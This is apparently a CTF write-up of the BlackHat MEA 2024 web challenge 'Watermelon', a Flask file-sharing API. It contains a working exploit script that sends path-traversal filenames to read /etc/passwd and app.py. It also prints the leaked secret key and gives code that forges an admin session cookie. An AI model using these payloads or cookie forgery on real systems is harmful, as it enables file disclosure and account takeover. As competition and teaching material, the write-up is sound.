---
title: "Watermelon - BlackHat MEA CTF Qualification 2024"
category: "web"
subcategory: "lfi"
type: "writeup"
tags: ["web", "path-traversal", "file-upload", "flask", "werkzeug", "sqlite", "lfi", "blackhat-mea-ctf-qualification", "blackhat-mea-ctf-qualification-202", "2024", "ctf-writeup"]
summary: "All love for Watermelons ???"
source:
  name: "CTFtime writeup #39405"
  url: "https://ctftime.org/writeup/39405"
ctf:
  name: "BlackHat MEA CTF Qualification 2024"
  year: 2024
  challenge: "Watermelon"
---

## Metadata

- **CTF:** BlackHat MEA CTF Qualification 2024
- **Task:** Watermelon
- **Author team:** CyberWalkers
- **CTFtime tags:** web
- **CTFtime:** <https://ctftime.org/writeup/39405>

---
# BHMEA2024 WEB CTF Writeup: Watermelon

## Challenge Description

**Watermelon**  
All love for Watermelons ??? Note: The code provided is without jailing, please note that when writing exploits.

Given instance URL: [<http://adfd1c3b69440b6b97b7d.playat.flagyard.com>](<http://adfd1c3b69440b6b97b7d.playat.flagyard.com/>)

## Initial Analysis

Upon receiving the challenge files, I started by examining the provided `[app.py](http://app.py)` file. The application was a Flask-based file sharing API with user registration, login, and file upload functionality. The interesting part was the file upload function, which seemed to have a potential vulnerability.

## Exploitation Process

### Step 1: Identifying the Vulnerability

The file upload function caught my attention:

```python  
@app.route("/upload", methods=["POST"])  
@login_required  
def upload_file():  
if 'file' not in request.files:  
return jsonify({"Error": "No file part"}), 400

file = request.files['file']  
if file.filename == '':  
return jsonify({"Error": "No selected file"}), 400

user_id = session.get('user_id')  
if file:  
blocked = ["proc", "self", "environ", "env"]  
filename = file.filename

if filename in blocked:  
return jsonify({"Error":"Why?"})

user_dir = os.path.join(app.config['UPLOAD_FOLDER'], str(user_id))  
os.makedirs(user_dir, exist_ok=True)

file_path = os.path.join(user_dir, filename)

file.save(f"{user_dir}/{secure_filename(filename)}")

new_file = File(filename=secure_filename(filename), filepath=file_path, user_id=user_id)  
db.session.add(new_file)  
db.session.commit()

return jsonify({"Message": "File uploaded successfully", "file_path": file_path}), 201

return jsonify({"Error": "File upload failed"}), 500

```

I noticed that while `secure_filename()` was used when saving the file, the `file_path` stored in the database used the unsanitized `filename`. This looked like a potential path traversal vulnerability.

### Step 2: Crafting the Exploit

To exploit this, I created a Python script to interact with the API:

```python  
import requests  
import json

BASE_URL = "<<http://adfd1c3b69440b6b97b7d.playat.flagyard.com>>"  
session = requests.Session()

def register_user(username, password):  
register_url = f"{BASE_URL}/register"  
data = {"username": username, "password": password}  
response = [session.post](http://session.post)(register_url, json=data)  
print(f"Registration response: {response.text}")  
return response.status_code == 201

def login(username, password):  
login_url = f"{BASE_URL}/login"  
data = {"username": username, "password": password}  
response = [session.post](http://session.post)(login_url, json=data)  
print(f"Login response: {response.text}")  
return response.status_code == 200

def upload_file(filename, content):  
upload_url = f"{BASE_URL}/upload"  
files = {'file': (filename, content)}  
response = [session.post](http://session.post)(upload_url, files=files)  
print(f"Upload response: {response.text}")  
return response.json().get('file_path') if response.status_code == 201 else None

def list_files():  
files_url = f"{BASE_URL}/files"  
response = session.get(files_url)  
print(f"Files list: {response.text}")  
return response.json().get('files') if response.status_code == 200 else []

def get_file_content(file_id):  
file_url = f"{BASE_URL}/file/{file_id}"  
response = session.get(file_url)  
return response.text if response.status_code == 200 else None

def main():  
username = "hacker2"  
password = "password123"

if not register_user(username, password) or not login(username, password):  
print("Registration or login failed")  
return

malicious_filenames = [  
"../../../../etc/passwd",  
"..%2F..%2F..%2F..%2Fetc%2Fpasswd",  
"/etc/passwd",  
"../../[app.py](http://app.py)",  
"[app.py](http://app.py)",  
"normal_file.txt"  
]

for filename in malicious_filenames:  
file_path = upload_file(filename, "dummy content")  
if file_path:  
print(f"File uploaded successfully. Path: {file_path}")  
else:  
print(f"File upload failed for {filename}")  
continue

files = list_files()  
if files:  
for file in files:  
content = get_file_content(file['id'])  
if content:  
print(f"Content of {file['filename']}:")  
print(content[:500]) # Print first 500 characters  
if "FLAG" in content:  
print("Found FLAG in the file content!")  
else:  
print(f"Failed to retrieve content for {file['filename']}")  
else:  
print("No files found or failed to list files")

if __name__ == "__main__":  
main()

```

### Step 3: Running the Exploit

I ran the script and got some interesting results. The most crucial one was partial content of the `[app.py](http://app.py)` file:

```python  
from flask import Flask, request, jsonify, session, send_file  
from functools import wraps  
from flask_sqlalchemy import SQLAlchemy  
import os, secrets  
from werkzeug.utils import secure_filename

app = Flask(__name__)  
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db.db'  
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False  
app.config['SECRET_KEY'] = "8e55dcf0df3722bd29b6c8b4f1d1f934"  
app.config['UPLOAD_FOLDER'] = 'files'

db = SQLAlchemy(app)

class User(db.Model):  
id = db.Column(db.Inte

```

The crucial discovery here was the `SECRET_KEY`.

### Step 4: Forging Admin Session

With the `SECRET_KEY`, I could forge an admin session cookie. I created another script to do this:

```python  
from flask.sessions import SecureCookieSessionInterface  
from itsdangerous import URLSafeTimedSerializer

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):  
def get_signing_serializer(self, app):  
if not app.secret_key:  
return None  
signer_kwargs = dict(  
key_derivation=self.key_derivation,  
digest_method=self.digest_method  
)  
return URLSafeTimedSerializer(app.secret_key, salt=self.salt,  
serializer=self.serializer,  
signer_kwargs=signer_kwargs)

def create_session_cookie(secret_key, session_data):  
interface = SimpleSecureCookieSessionInterface()  
app = type('App', (), {'secret_key': secret_key})()  
serializer = interface.get_signing_serializer(app)  
return serializer.dumps(session_data)

# Use the SECRET_KEY we found  
secret_key = "8e55dcf0df3722bd29b6c8b4f1d1f934"

# Create a session for the admin user  
session_data = {'username': 'admin', 'user_id': 1} # Assuming admin has user_id 1  
cookie = create_session_cookie(secret_key, session_data)

print(f"Forged session cookie: {cookie}")  
print("Use this cookie in your next request to access the admin route.")

```

### Step 5: Accessing the Admin Route

Finally, I used the forged cookie to access the admin route:

```python  
import requests

BASE_URL = "<<http://adfd1c3b69440b6b97b7d.playat.flagyard.com>>"  
forged_cookie = "Forged-Cookie-Here" # Replace with the output from the previous script

cookies = {'session': forged_cookie}  
response = requests.get(f"{BASE_URL}/admin", cookies=cookies)

print(response.text)

BHFlagY{3be80c27defdeef0b6e879d4bcc475b7}  
```

This final request to the admin route revealed the flag, successfully completing the challenge.
